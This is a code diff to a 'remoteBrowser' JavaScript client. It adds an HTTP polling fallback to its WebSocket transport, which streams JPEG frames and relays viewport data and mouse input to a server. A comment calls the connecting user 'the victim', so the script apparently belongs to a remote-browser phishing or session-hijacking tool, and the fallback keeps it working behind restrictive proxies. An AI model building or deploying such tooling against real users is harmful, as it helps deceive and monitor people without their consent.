@@ -1,25 +1,129 @@
 (function () {
-  var wsProto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-  var ws = new WebSocket(wsProto + '//' + window.location.host + '/__WS_PATH__/__CR_ID__/__RB_ID__');
-  ws.binaryType = 'arraybuffer'; // stream frames arrive as raw binary JPEG messages
   var h = {};              // event handlers keyed as "e:eventName" or "stream_start:name" etc.
   var streams = {};        // name → {canvas, w, h, cssW, cssH, autoSize, el}
   var streamLastStart = {} // name → last stream_start message, so mountStream called late still sizes correctly
 
-  ws.onopen = function () {
-    ws.send(JSON.stringify({ type: 'viewport', width: window.innerWidth, height: window.innerHeight, dpr: window.devicePixelRatio || 1, screenWidth: screen.width, screenHeight: screen.height }));
-  };
+  // Transport. The victim connects over a WebSocket, or an HTTP polling fallback
+  // when the WebSocket upgrade is blocked (for example by a proxy that strips the
+  // Upgrade header). The server sets the default mode and poll interval below;
+  // "polling" forces the fallback and skips the WebSocket entirely. Streaming
+  // (live view) is only available over the WebSocket.
+  var MODE = '__RB_TRANSPORT__';
+  var POLL_MS = parseInt('__RB_POLL_MS__', 10) || 1000;
+  var host = window.location.host;
+  var wsPath = '/__WS_PATH__/__CR_ID__/__RB_ID__';
+  var wsURL = (window.location.protocol === 'https:' ? 'wss:' : 'ws:') + '//' + host + wsPath;
+  // per page-load nonce: lets the server tell a reload (start fresh) from this
+  // same instance still polling after the session ended (stop).
+  var SID = (self.crypto && crypto.randomUUID) ? crypto.randomUUID() : (Date.now().toString(36) + Math.random().toString(36).slice(2));
+  var pollURL = (window.location.protocol === 'https:' ? 'https:' : 'http:') + '//' + host + wsPath + '/poll?s=' + SID;
+  var pollStopped = false; // set when the server signals the session is over
 
-  // The connection stays open only while the server side script is still running
-  // (waiting on an event, in s.listen(), or parked by s.keepAlive()). Once the
-  // script ends the server closes this socket, and any later send() is dropped.
-  // Log both so a discarded message is visible instead of silent.
-  ws.onclose = function (e) {
-    console.warn('[remoteBrowser] connection closed (code ' + e.code + '); further send() calls are discarded');
-  };
-  ws.onerror = function () {
-    console.warn('[remoteBrowser] connection error');
-  };
+  var transport = null;    // { isOpen(), send(obj) }
+  var viewportSent = false;
+
+  // onReady records the live transport and sends the viewport once.
+  function onReady(t) {
+    transport = t;
+    if (!viewportSent) {
+      viewportSent = true;
+      t.send({ type: 'viewport', width: window.innerWidth, height: window.innerHeight, dpr: window.devicePixelRatio || 1, screenWidth: screen.width, screenHeight: screen.height });
+    }
+  }
+
+  // startWS opens the WebSocket. In auto mode a failure before the socket opens
+  // switches to polling. Once open it stays up only while the server side script
+  // is still running; the server closes it when the script ends.
+  function startWS(allowFallback) {
+    var ws = new WebSocket(wsURL);
+    ws.binaryType = 'arraybuffer'; // stream frames arrive as raw binary JPEG messages
+    var opened = false, settled = false;
+    function fallback() {
+      if (settled) return;
+      settled = true;
+      console.warn('[remoteBrowser] WebSocket unavailable, falling back to HTTP polling');
+      startPolling();
+    }
+    ws.onopen = function () {
+      // If the fallback already fired (slow upgrade that opened just after the
+      // timeout), discard this late socket so polling is not run alongside it.
+      if (settled) { try { ws.close(); } catch (e) {} return; }
+      opened = true; settled = true;
+      onReady({
+        isOpen: function () { return ws.readyState === 1; },
+        send: function (o) {
+          if (ws.readyState === 1) ws.send(JSON.stringify(o));
+          else console.warn('[remoteBrowser] send discarded: connection is not open (readyState ' + ws.readyState + ')');
+        }
+      });
+    };
+    ws.onmessage = function (e) { handleMessage(e.data); };
+    ws.onclose = function (e) {
+      if (!opened && allowFallback) { fallback(); return; }
+      console.warn('[remoteBrowser] connection closed (code ' + e.code + '); further send() calls are discarded');
+    };
+    ws.onerror = function () {
+      if (!opened && allowFallback) { fallback(); return; }
+      console.warn('[remoteBrowser] connection error');
+    };
+    if (allowFallback) {
+      // Some proxies accept the request but never complete the upgrade; fall back
+      // if the socket has not opened shortly.
+      setTimeout(function () {
+        if (!opened) { try { ws.close(); } catch (e) {} fallback(); }
+      }, 4000);
+    }
+  }
+
+  // startPolling drives the HTTP fallback: a GET drain loop on the poll interval
+  // and POSTs for outbound messages. Messages are length-prefixed (4-byte
+  // big-endian length then bytes) so one request can carry several.
+  function startPolling() {
+    var closed = false;
+    var sendQueue = [];
+    var posting = false;
+    var enc = new TextEncoder();
+    function encodeBatch(strs) {
+      var bufs = strs.map(function (s) { return enc.encode(s); });
+      var total = 0;
+      bufs.forEach(function (b) { total += 4 + b.length; });
+      var out = new Uint8Array(total);
+      var dv = new DataView(out.buffer);
+      var off = 0;
+      bufs.forEach(function (b) { dv.setUint32(off, b.length); off += 4; out.set(b, off); off += b.length; });
+      return out;
+    }
+    function decodeBatch(buf) {
+      var dv = new DataView(buf), off = 0, out = [], dec = new TextDecoder();
+      while (off + 4 <= buf.byteLength) {
+        var n = dv.getUint32(off); off += 4;
+        if (off + n > buf.byteLength) break;
+        out.push(dec.decode(new Uint8Array(buf, off, n))); off += n;
+      }
+      return out;
+    }
+    function flush() {
+      if (posting || closed || pollStopped || sendQueue.length === 0) return;
+      posting = true;
+      var batch = sendQueue; sendQueue = [];
+      fetch(pollURL, { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/octet-stream' }, body: encodeBatch(batch) })
+        .catch(function () {})
+        .then(function () { posting = false; if (sendQueue.length) flush(); });
+    }
+    function poll() {
+      if (closed || pollStopped) return;
+      fetch(pollURL, { method: 'GET', credentials: 'same-origin' })
+        .then(function (r) { return r.arrayBuffer(); })
+        .then(function (buf) { decodeBatch(buf).forEach(function (s) { handleMessage(s); }); })
+        .catch(function () {})
+        .then(function () { if (!closed && !pollStopped) setTimeout(poll, POLL_MS); });
+    }
+    onReady({
+      isOpen: function () { return !closed && !pollStopped; },
+      send: function (o) { if (pollStopped) return; sendQueue.push(JSON.stringify(o)); flush(); }
+    });
+    poll();
+  }
 
   // Apply stream_start sizing to an already-mounted stream entry.
   function applyStreamStart(st, m) {
@@ -68,16 +172,21 @@
     })();
   }
 
-  ws.onmessage = function (e) {
-    // Binary messages are raw JPEG stream frames.
-    if (typeof e.data !== 'string') {
-      handleStreamFrame(e.data);
+  function handleMessage(data) {
+    // Binary messages are raw JPEG stream frames (WebSocket only).
+    if (typeof data !== 'string') {
+      handleStreamFrame(data);
       return;
     }
     try {
-      var m = JSON.parse(e.data);
+      var m = JSON.parse(data);
 
-      if (m.type === 'event' && m.key) {
+      if (m.type === 'closed') {
+        // Server signalled the session is over: stop the poll loop so it does
+        // not re-create a session on the next request.
+        pollStopped = true;
+
+      } else if (m.type === 'event' && m.key) {
         (h['e:' + m.key] || []).forEach(function (f) { f(m.value); });
 
       } else if (m.type === 'stream_start' && m.name) {
@@ -148,10 +257,10 @@
     },
 
     send: function (ev, data) {
-      if (ws.readyState === 1) {
-        ws.send(JSON.stringify({ event: ev, data: data || {} }));
+      if (transport && transport.isOpen()) {
+        transport.send({ event: ev, data: data || {} });
       } else {
-        console.warn('[remoteBrowser] send("' + ev + '") discarded: connection is not open (readyState ' + ws.readyState + ')');
+        console.warn('[remoteBrowser] send("' + ev + '") discarded: connection is not open');
       }
     },
 
@@ -195,7 +304,7 @@
       }
 
       function snd(o) {
-        if (ws.readyState === 1) ws.send(JSON.stringify(o));
+        if (transport && transport.isOpen()) transport.send(o);
       }
 
       canvas.addEventListener('mousedown', function (e) {
@@ -291,4 +400,12 @@
   };
 
   window.rb = window.remoteBrowser;
+
+  // Start the transport. Polling mode skips the WebSocket; auto tries the
+  // WebSocket first and falls back to polling if the upgrade is blocked.
+  if (MODE === 'polling') {
+    startPolling();
+  } else {
+    startWS(true);
+  }
 })();
